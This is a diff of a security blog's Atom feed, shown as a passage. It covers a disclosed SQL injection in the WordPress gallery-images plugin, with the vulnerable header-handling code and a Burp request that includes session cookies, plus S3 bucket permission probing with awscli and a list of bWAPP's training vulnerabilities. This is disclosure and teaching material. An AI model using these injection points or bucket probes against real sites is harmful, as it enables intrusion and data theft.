+&lt;p&gt;WPScan output, no issues known:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[+] Name: gallery-images - v1.8.6  
+ |  Location: https://[REDACTED]/wp-content/plugins/gallery-images/  
+ |  Readme: https://[REDACTED]/wp-content/plugins/gallery-images/readme.txt  
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;After a fast search on &lt;a href=&quot;https://www.exploit-db.com/&quot; target=&quot;_blank&quot;&gt;exploit-db.com&lt;/a&gt; with no success, I finally decided to download it and read the code to find vulnerabilites by myself.
+Since the readme was available, I was able to confirm the version of the plugin.&lt;/p&gt;
+
+&lt;p&gt;I was looking for two kind of vulnerabilities: file upload and sql injection.
+First thing I did was to locate PHP files, and grepping the result to find &lt;code class=&quot;highlighter-rouge&quot;&gt;Content-Disposition&lt;/code&gt; header:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;find . -name &lt;span class=&quot;s2&quot;&gt;&quot;*.php*&quot;&lt;/span&gt; | xargs grep -i header
+./Front_end/gallery_front_end_view.php:							header&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Location:&quot;&lt;/span&gt;.&lt;span class=&quot;nv&quot;&gt;$actual_link&lt;/span&gt;.&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;;
+./Front_end/gallery_front_end_view.php:							header&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Location:&quot;&lt;/span&gt;.&lt;span class=&quot;nv&quot;&gt;$actual_link&lt;/span&gt;.&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;;
+./Front_end/gallery_front_end_view.php:							header&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Location:&quot;&lt;/span&gt;.&lt;span class=&quot;nv&quot;&gt;$actual_link&lt;/span&gt;.&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;;
+./Front_end/gallery_front_end_view.php:							header&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Location:&quot;&lt;/span&gt;.&lt;span class=&quot;nv&quot;&gt;$actual_link&lt;/span&gt;.&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;;
+./Front_end/gallery_front_end_view.php:		/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;HEIGHT FROM HEADER.PHP&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/
+./Front_end/gallery_front_end_view.php:							header&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Location:&quot;&lt;/span&gt;.&lt;span class=&quot;nv&quot;&gt;$actual_link&lt;/span&gt;.&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;;
+./Front_end/gallery_front_end_view.php:							header&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Location:&quot;&lt;/span&gt;.&lt;span class=&quot;nv&quot;&gt;$actual_link&lt;/span&gt;.&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;;
+./Front_end/gallery_front_end_view.php:							header&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Location:&quot;&lt;/span&gt;.&lt;span class=&quot;nv&quot;&gt;$actual_link&lt;/span&gt;.&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;;
+./Front_end/gallery_front_end_view.php:							header&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Location:&quot;&lt;/span&gt;.&lt;span class=&quot;nv&quot;&gt;$actual_link&lt;/span&gt;.&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;;
+./Front_end/gallery_front_end_view.php:							header&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Location:&quot;&lt;/span&gt;.&lt;span class=&quot;nv&quot;&gt;$actual_link&lt;/span&gt;.&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;;
+./Front_end/gallery_front_end_view.php:							header&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Location:&quot;&lt;/span&gt;.&lt;span class=&quot;nv&quot;&gt;$actual_link&lt;/span&gt;.&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;;
+./admin/gallery_func.php:			header&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Location: admin.php?page=gallerys_huge_it_gallery&amp;amp;id='&lt;/span&gt;.&lt;span class=&quot;nv&quot;&gt;$rowsldccs&lt;/span&gt;-&amp;gt;id.&lt;span class=&quot;s1&quot;&gt;'&amp;amp;task=apply'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;;
+./admin/gallery_view.php:	header&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Location: admin.php?page=gallerys_huge_it_gallery&amp;amp;id='&lt;/span&gt;.&lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;-&amp;gt;id.&lt;span class=&quot;s1&quot;&gt;'&amp;amp;task=apply'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;;
+./admin/gallery_view.php:	&amp;lt;div &lt;span class=&quot;nv&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;gallery-header&quot;&lt;/span&gt;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;!--more--&gt;
+
+&lt;p&gt;Nothing interesting here…&lt;/p&gt;
+
+&lt;p&gt;Then, I noticed that the “non admin” requests where mainly coded in two files: &lt;code class=&quot;highlighter-rouge&quot;&gt;gallery-images.php&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Front_end/gallery_front_end_view.php&lt;/code&gt;.
+Luckily I started to read the first one which contains the hole.&lt;/p&gt;
+
+&lt;p&gt;In the function &lt;code class=&quot;highlighter-rouge&quot;&gt;huge_it_image_gallery_ajax_callback&lt;/code&gt;, the variable &lt;code class=&quot;highlighter-rouge&quot;&gt;$huge_it_ip&lt;/code&gt; is used multiple times in the following form:&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$wpdb-&amp;gt;prepare(&quot;SELECT `image_status`,`ip` FROM &quot;.$wpdb-&amp;gt;prefix.&quot;huge_itgallery_like_dislike WHERE image_id = %d AND `ip` = '&quot;.$huge_it_ip.&quot;'&quot;,(int)$row-&amp;gt;id);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;This variable is defined at the top of the file:&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if(!empty($_SERVER['HTTP_CLIENT_IP'])){
+	$huge_it_ip=$_SERVER['HTTP_CLIENT_IP'];
+}
+elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
+	$huge_it_ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
+}
+else{
+	$huge_it_ip=$_SERVER['REMOTE_ADDR'];
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Unfortunately HTTP headers cannot be trusted, even ip address.
+So I started to test the injection in &lt;code class=&quot;highlighter-rouge&quot;&gt;X-Forwarded-For&lt;/code&gt; header and it worked perfectly on my local install.
+However the site I was testing seems to had a firewall who drop this header. 
+I then tested the injection in &lt;code class=&quot;highlighter-rouge&quot;&gt;Client-Ip&lt;/code&gt; header and it passed !&lt;/p&gt;
+
+&lt;p&gt;Note that the plugin must be enabled to be able to exploit the injection.
+Finally here is the full request in Burp Suite:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: local.wordpress.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.8.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://local.wordpress.com/wp-admin/admin.php?page=gallerys_huge_it_gallery&amp;amp;task=edit_cat&amp;amp;id=1
+Content-Length: 89
+Client-Ip: 123.123.123.123
+Cookie: wordpress_3e0ed6e299d95d3a38b8516e25f1b1e2=admin%7C1463913228%7CYRWrxl5s69SoSkkXyMBFnXzSt2dSINk63ojC6F0mcWJ%7Cb28be90ae8a75452f047cb21fcc84f42a9a801123af24c1f77bb3f19c880147b; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_3e0ed6e299d95d3a38b8516e25f1b1e2=admin%7C1463913228%7CYRWrxl5s69SoSkkXyMBFnXzSt2dSINk63ojC6F0mcWJ%7C243730f21ebdc724e25dd292d6c8d1773510dd572a0a39abc88b379852181f1f; wp-settings-1=libraryContent%3Dbrowse%26editor%3Dtinymce; wp-settings-time-1=1463740430; PHPSESSID=e5a63r274m6mvcfbmblgacrvq0
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+action=huge_it_video_gallery_ajax&amp;amp;task=load_images_content&amp;amp;galleryid=1&amp;amp;page=1&amp;amp;perpage=100
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;The parameter &lt;code class=&quot;highlighter-rouge&quot;&gt;task&lt;/code&gt; can be one of the following:&lt;br /&gt;
+load_images_content&lt;br /&gt;
+load_images_lightbox&lt;br /&gt;
+load_image_justified&lt;br /&gt;
+load_image_thumbnail&lt;br /&gt;
+load_blog_view&lt;/p&gt;
+
+&lt;p&gt;And the result:
+&lt;a href=&quot;/images/image-gallery-sql-injection.png&quot;&gt;&lt;img src=&quot;/images/image-gallery-sql-injection.png&quot; alt=&quot;sqlmap injection&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;A Full Path Disclosure is also available if you call &lt;code class=&quot;highlighter-rouge&quot;&gt;http://www.example.com/wp-content/plugins/gallery-images/gallery-images.php&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;I sent an email to Huge-IT who released a fix the same day. Fast enough :)&lt;/p&gt;
+
+    &lt;p&gt;&lt;a href=&quot;http://10degres.net/image-gallery-sql-injection/&quot;&gt;Image Gallery SQL Injection&lt;/a&gt; was originally published by Gwen at &lt;a href=&quot;http://10degres.net&quot;&gt;Gwendal Le Coguic&lt;/a&gt; on May 20, 2016.&lt;/p&gt;
+  </content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[Playing with S3 buckets]]></title>
+ <link rel="alternate" type="text/html" href="http://10degres.net/playing-with-s3-buckets/" />
+  <id>http://10degres.net/playing-with-s3-buckets</id>
+  <published>2016-04-15T00:00:00+01:00</published>
+  <updated>2016-04-15T00:00:00+01:00</updated>
+  <author>
+    <name>Gwen</name>
+    <uri>http://10degres.net</uri>
+    <email>g@10degres.net</email>
+  </author>
+  <content type="html">
+    &lt;p&gt;Amazon Simple Storage Service aka S3 is a cloud storage for the Internet. 
+You first create a bucket and you can then upload any number of objects (photos, videos, documents etc.) to it.
+However if the permissions (ACL) are not well settled, bad things can happen.&lt;/p&gt;
+
+&lt;p&gt;Recently disclosed by Hackerone, a misconfiguration in their Amazon Web Services S3 buckets allowed any authenticated user to write in there.
+From here an attacker could upload a malicious file waiting for someone open it, or overwrite existing files.&lt;/p&gt;
+
+&lt;p&gt;When you crawl a website, you can you can check the presence of S3 by intercepting calls to &lt;code class=&quot;highlighter-rouge&quot;&gt;amazonaws.com&lt;/code&gt;.
+The bucket call can have different look:
+&lt;code class=&quot;highlighter-rouge&quot;&gt;https://&amp;lt;aws_region&amp;gt;.amazonaws.com/&amp;lt;bucket_name&amp;gt;/&amp;lt;file_path&amp;gt;&lt;/code&gt;&lt;br /&gt;
+or:&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;https://&amp;lt;bucket_name&amp;gt;.amazonaws.com/&amp;lt;file_path&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Once you get the bucket name, you can execute many tests using &lt;strong&gt;awscli&lt;/strong&gt; to check his permissions.
+If you try to access to a bucket who doesn’t exist, you’ll get this message:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;aws s3 ls s3://gwen001-azertyuiop  
+A client error &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;NoSuchBucket&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; occurred when calling the ListObjects operation: The specified bucket does not exist
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;If you try to execute a command you are not allowed to, you’ll then get something like this:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;aws s3 ls s3://gwen001-test000/
+A client error &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;AccessDenied&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; occurred when calling the ListObjects operation: Access Denied
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;!--more--&gt;
+&lt;p&gt;For the purpose of this article I created some buckets with differents permissions:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Bucket&lt;/th&gt;
+      &lt;th&gt;Grantee&lt;/th&gt;
+      &lt;th&gt;Read&lt;/th&gt;
+      &lt;th&gt;Write&lt;/th&gt;
+      &lt;th&gt;get ACL&lt;/th&gt;
+      &lt;th&gt;set ACL&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;test000&lt;/td&gt;
+      &lt;td&gt;-&lt;/td&gt;
+      &lt;td&gt;-&lt;/td&gt;
+      &lt;td&gt;-&lt;/td&gt;
+      &lt;td&gt;-&lt;/td&gt;
+      &lt;td&gt;-&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;test001&lt;/td&gt;
+      &lt;td&gt;me&lt;/td&gt;
+      &lt;td&gt;yes&lt;/td&gt;
+      &lt;td&gt;yes&lt;/td&gt;
+      &lt;td&gt;yes&lt;/td&gt;
+      &lt;td&gt;yes&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;test002&lt;/td&gt;
+      &lt;td&gt;Everyone&lt;/td&gt;
+      &lt;td&gt;yes&lt;/td&gt;
+      &lt;td&gt;-&lt;/td&gt;
+      &lt;td&gt;-&lt;/td&gt;
+      &lt;td&gt;-&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;test003&lt;/td&gt;
+      &lt;td&gt;Everyone&lt;/td&gt;
+      &lt;td&gt;yes&lt;/td&gt;
+      &lt;td&gt;yes&lt;/td&gt;
+      &lt;td&gt;-&lt;/td&gt;
+      &lt;td&gt;-&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;test004&lt;/td&gt;
+      &lt;td&gt;Everyone&lt;/td&gt;
+      &lt;td&gt;yes&lt;/td&gt;
+      &lt;td&gt;yes&lt;/td&gt;
+      &lt;td&gt;yes&lt;/td&gt;
+      &lt;td&gt;-&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;test005&lt;/td&gt;
+      &lt;td&gt;Everyone&lt;/td&gt;
+      &lt;td&gt;yes&lt;/td&gt;
+      &lt;td&gt;yes&lt;/td&gt;
+      &lt;td&gt;yes&lt;/td&gt;
+      &lt;td&gt;yes&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Using my brain and bit of Bash, I wrote a script based on a wordlist to discover and test my buckets.
+The wordlist: 
+&lt;code class=&quot;highlighter-rouge&quot;&gt;test000 test001 testme test002 test003 test004 test005 testx&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;The script:&lt;br /&gt;
+https://github.com/gwen001/pentest-tools/blob/master/s3-buckets-force.sh&lt;/p&gt;
+
+&lt;p&gt;The output:
+&lt;a href=&quot;/images/s3-bucket-test.png&quot;&gt;&lt;img src=&quot;/images/s3-bucket-test.png&quot; alt=&quot;s3 bucket test&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Finally 6 buckets has been found, which is correct, and the permissions has also been tested.&lt;/p&gt;
+
+&lt;p&gt;When &lt;code class=&quot;highlighter-rouge&quot;&gt;Edit Permissions&lt;/code&gt; is allowed for &lt;code class=&quot;highlighter-rouge&quot;&gt;Everyone&lt;/code&gt;, this is the deadly zone but don’t underestimate the power of read only.
+From a pentester point of view this is a very good start to gather informations about your business and for a hacker it’s a great source to leak your datas.&lt;/p&gt;
+
+
+    &lt;p&gt;&lt;a href=&quot;http://10degres.net/playing-with-s3-buckets/&quot;&gt;Playing with S3 buckets&lt;/a&gt; was originally published by Gwen at &lt;a href=&quot;http://10degres.net&quot;&gt;Gwendal Le Coguic&lt;/a&gt; on April 15, 2016.&lt;/p&gt;
+  </content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[An extremely buggy web app !]]></title>
+ <link rel="alternate" type="text/html" href="http://10degres.net/an-extremely-buggy-web-app/" />
+  <id>http://10degres.net/an-extremely-buggy-web-app</id>
+  <published>2016-01-28T00:00:00+00:00</published>
+  <updated>2016-01-28T00:00:00+00:00</updated>
+  <author>
+    <name>Gwen</name>
+    <uri>http://10degres.net</uri>
+    <email>g@10degres.net</email>
+  </author>
+  <content type="html">
+    &lt;p&gt;&lt;strong&gt;bWAPP&lt;/strong&gt; is a PHP web application which is intentionnally crackable. It covers a very large set of common vulns but also some unusual case you can meet on the Internet.&lt;/p&gt;
+
+&lt;p&gt;The goal here is to train your development skill and hacking knowledge to be able to write a better (more secure) code.
+Compared to &lt;a href=&quot;/damn-vulnerable-web-application/&quot;&gt;DVWA&lt;/a&gt;, you have to consider bWAPP as a much more advanced level of difficulty.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/images/bwapp.png&quot;&gt;&lt;img src=&quot;/images/bwapp.png&quot; alt=&quot;bwapp&quot; /&gt;&lt;/a&gt;
+&lt;!--more--&gt;&lt;/p&gt;
+
+&lt;p&gt;Below the impressive list of bugs implemented:&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Injection&lt;/strong&gt;&lt;br /&gt;
+HTML Injection - Reflected (GET)&lt;br /&gt;
+HTML Injection - Reflected (POST)&lt;br /&gt;
+HTML Injection - Reflected (Current URL)&lt;br /&gt;
+HTML Injection - Stored (Blog)&lt;br /&gt;
+iFrame Injection&lt;br /&gt;
+LDAP Injection (Search)&lt;br /&gt;
+Mail Header Injection (SMTP)&lt;br /&gt;
+OS Command Injection&lt;br /&gt;
+OS Command Injection - Blind&lt;br /&gt;
+PHP Code Injection&lt;br /&gt;
+Server-Side Includes (SSI) Injection&lt;br /&gt;
+SQL Injection (GET/Search)&lt;br /&gt;
+SQL Injection (GET/Select)&lt;br /&gt;
+SQL Injection (POST/Search)&lt;br /&gt;
+SQL Injection (POST/Select)&lt;br /&gt;
+SQL Injection (AJAX/JSON/jQuery)&lt;br /&gt;
+SQL Injection (CAPTCHA)&lt;br /&gt;
+SQL Injection (Login Form/Hero)&lt;br /&gt;
+SQL Injection (Login Form/User)&lt;br /&gt;
+SQL Injection (SQLite)&lt;br /&gt;
+SQL Injection (Drupal)&lt;br /&gt;
+SQL Injection - Stored (Blog)&lt;br /&gt;
+SQL Injection - Stored (SQLite)&lt;br /&gt;
+SQL Injection - Stored (User-Agent)&lt;br /&gt;
+SQL Injection - Stored (XML)&lt;br /&gt;
+SQL Injection - Blind - Boolean-Based&lt;br /&gt;
+SQL Injection - Blind - Time-Based&lt;br /&gt;
+SQL Injection - Blind (SQLite)&lt;br /&gt;
+SQL Injection - Blind (Web Services/SOAP)&lt;br /&gt;
+XML/XPath Injection (Login Form)&lt;br /&gt;
+XML/XPath Injection (Search)&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Broken Auth. &amp;amp; Session Mgmt.&lt;/strong&gt;&lt;br /&gt;
+Broken Authentication - CAPTCHA Bypassing&lt;br /&gt;
+Broken Authentication - Forgotten Function&lt;br /&gt;
+Broken Authentication - Insecure Login Forms&lt;br /&gt;
+Broken Authentication - Logout Management&lt;br /&gt;
+Broken Authentication - Password Attacks&lt;br /&gt;
+Broken Authentication - Weak Passwords&lt;br /&gt;
+Session Management - Administrative Portals&lt;br /&gt;
+Session Management - Cookies (HTTPOnly)&lt;br /&gt;
+Session Management - Cookies (Secure)&lt;br /&gt;
+Session Management - Session ID in URL&lt;br /&gt;
+Session Management - Strong Sessions&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Cross-Site Scripting (XSS)&lt;/strong&gt;&lt;br /&gt;
+Cross-Site Scripting - Reflected (GET)&lt;br /&gt;
+Cross-Site Scripting - Reflected (POST)&lt;br /&gt;
+Cross-Site Scripting - Reflected (JSON)&lt;br /&gt;
+Cross-Site Scripting - Reflected (AJAX/JSON)&lt;br /&gt;
+Cross-Site Scripting - Reflected (AJAX/XML)&lt;br /&gt;
+Cross-Site Scripting - Reflected (Back Button)&lt;br /&gt;
+Cross-Site Scripting - Reflected (Custom Header)&lt;br /&gt;
+Cross-Site Scripting - Reflected (Eval)&lt;br /&gt;
+Cross-Site Scripting - Reflected (HREF)&lt;br /&gt;
+Cross-Site Scripting - Reflected (Login Form)&lt;br /&gt;
+Cross-Site Scripting - Reflected (phpMyAdmin)&lt;br /&gt;
+Cross-Site Scripting - Reflected (PHP_SELF)&lt;br /&gt;
+Cross-Site Scripting - Reflected (Referer)&lt;br /&gt;
+Cross-Site Scripting - Reflected (User-Agent)&lt;br /&gt;
+Cross-Site Scripting - Stored (Blog)&lt;br /&gt;
+Cross-Site Scripting - Stored (Change Secret)&lt;br /&gt;
+Cross-Site Scripting - Stored (Cookies)&lt;br /&gt;
+Cross-Site Scripting - Stored (SQLiteManager)&lt;br /&gt;
+Cross-Site Scripting - Stored (User-Agent)&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Insecure Direct Object References&lt;/strong&gt;&lt;br /&gt;
+Insecure DOR (Change Secret)&lt;br /&gt;
+Insecure DOR (Reset Secret)&lt;br /&gt;
+Insecure DOR (Order Tickets)&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Security Misconfiguration&lt;/strong&gt;&lt;br /&gt;
+Arbitrary File Access (Samba)&lt;br /&gt;
+Cross-Domain Policy File (Flash)&lt;br /&gt;
+Cross-Origin Resource Sharing (AJAX)&lt;br /&gt;
+Cross-Site Tracing (XST)&lt;br /&gt;
+Denial-of-Service (Large Chunk Size)&lt;br /&gt;
+Denial-of-Service (Slow HTTP DoS)&lt;br /&gt;
+Denial-of-Service (SSL-Exhaustion)&lt;br /&gt;
+Denial-of-Service (XML Bomb)&lt;br /&gt;
+Insecure FTP Configuration&lt;br /&gt;
+Insecure SNMP Configuration&lt;br /&gt;
+Insecure WebDAV Configuration&lt;br /&gt;
+Local Privilege Escalation (sendpage)&lt;br /&gt;
+Local Privilege Escalation (udev)&lt;br /&gt;
+Man-in-the-Middle Attack (HTTP)&lt;br /&gt;
+Man-in-the-Middle Attack (SMTP)&lt;br /&gt;
+Old/Backup &amp;amp; Unreferenced Files&lt;br /&gt;
+Robots File&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Sensitive Data Exposure&lt;/strong&gt;&lt;br /&gt;
+Base64 Encoding (Secret)&lt;br /&gt;
+BEAST/CRIME/BREACH Attacks&lt;br /&gt;
+Clear Text HTTP (Credentials)&lt;br /&gt;
+Heartbleed Vulnerability&lt;br /&gt;
+Host Header Attack (Reset Poisoning)&lt;br /&gt;
+HTML5 Web Storage (Secret)&lt;br /&gt;
+POODLE Vulnerability&lt;br /&gt;
+SSL 2.0 Deprecated Protocol&lt;br /&gt;
+Text Files (Accounts)&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Missing Functional Level Access Control&lt;/strong&gt;&lt;br /&gt;
+Directory Traversal - Directories&lt;br /&gt;
+Directory Traversal - Files&lt;br /&gt;
+Host Header Attack (Cache Poisoning)&lt;br /&gt;
+Host Header Attack (Reset Poisoning)&lt;br /&gt;
+Local File Inclusion (SQLiteManager)&lt;br /&gt;
+Remote &amp;amp; Local File Inclusion (RFI/LFI)&lt;br /&gt;
+Restrict Device Access&lt;br /&gt;
+Restrict Folder Access&lt;br /&gt;
+Server Side Request Forgery (SSRF)&lt;br /&gt;
+XML External Entity Attacks (XXE)&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Cross-Site Request Forgery (CSRF)&lt;/strong&gt;&lt;br /&gt;
+Cross-Site Request Forgery (Change Password)&lt;br /&gt;
+Cross-Site Request Forgery (Change Secret)&lt;br /&gt;
+Cross-Site Request Forgery (Transfer Amount)&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Using Known Vulnerable Components&lt;/strong&gt;&lt;br /&gt;
+Buffer Overflow (Local)&lt;br /&gt;
+Buffer Overflow (Remote)&lt;br /&gt;
+Drupal SQL Injection (Drupageddon)&lt;br /&gt;
+Heartbleed Vulnerability&lt;br /&gt;
+PHP CGI Remote Code Execution&lt;br /&gt;
+PHP Eval Function&lt;br /&gt;
+phpMyAdmin BBCode Tag XSS&lt;br /&gt;
+Shellshock Vulnerability (CGI)&lt;br /&gt;
+SQLiteManager Local File Inclusion&lt;br /&gt;
+SQLiteManager PHP Code Injection&lt;br /&gt;
+SQLiteManager XSS&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Unvalidated Redirects &amp;amp; Forwards&lt;/strong&gt;&lt;br /&gt;
+Unvalidated Redirects &amp;amp; Forwards (1)&lt;br /&gt;
+Unvalidated Redirects &amp;amp; Forwards (2)&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Other bugs…&lt;/strong&gt;&lt;br /&gt;
+ClickJacking (Movie Tickets)&lt;br /&gt;
+Client-Side Validation (Password)&lt;br /&gt;
+HTTP Parameter Pollution&lt;br /&gt;
+HTTP Response Splitting&lt;br /&gt;
+HTTP Verb Tampering&lt;br /&gt;
+Information Disclosure - Favicon&lt;br /&gt;
+Information Disclosure - Headers&lt;br /&gt;
+Information Disclosure - PHP version&lt;br /&gt;
+Information Disclosure - Robots File&lt;br /&gt;
+Insecure iFrame (Login Form)&lt;br /&gt;
+Unrestricted File Upload&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Extras&lt;/strong&gt;&lt;br /&gt;
+A.I.M. - No-authentication Mode&lt;br /&gt;
+Client Access Policy File&lt;br /&gt;
+Cross-Domain Policy File&lt;br /&gt;
+Evil 666 Fuzzing Page&lt;br /&gt;
+Manual Intervention Required!&lt;br /&gt;
+Unprotected Admin Portal&lt;br /&gt;
+We Steal Secrets… (html)&lt;br /&gt;
+We Steal Secrets… (plain)&lt;br /&gt;
+WSDL File (Web Services/SOAP)&lt;/p&gt;
+
+&lt;p&gt;Have fun !&lt;/p&gt;
+
+    &lt;p&gt;&lt;a href=&quot;http://10degres.net/an-extremely-buggy-web-app/&quot;&gt;An extremely buggy web app !&lt;/a&gt; was originally published by Gwen at &lt;a href=&quot;http://10degres.net&quot;&gt;Gwendal Le Coguic&lt;/a&gt; on January 28, 2016.&lt;/p&gt;
+  </content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[Sqlmap]]></title>
+ <link rel="alternate" type="text/html" href="http://10degres.net/sqlmap/" />
+  <id>http://10degres.net/sqlmap</id>
+  <published>2016-01-18T00:00:00+00:00</published>
+  <updated>2016-01-18T00:00:00+00:00</updated>
+  <author>
+    <name>Gwen</name>
+    <uri>http://10degres.net</uri>
+    <email>g@10degres.net</email>
+  </author>
+  <content type="html">
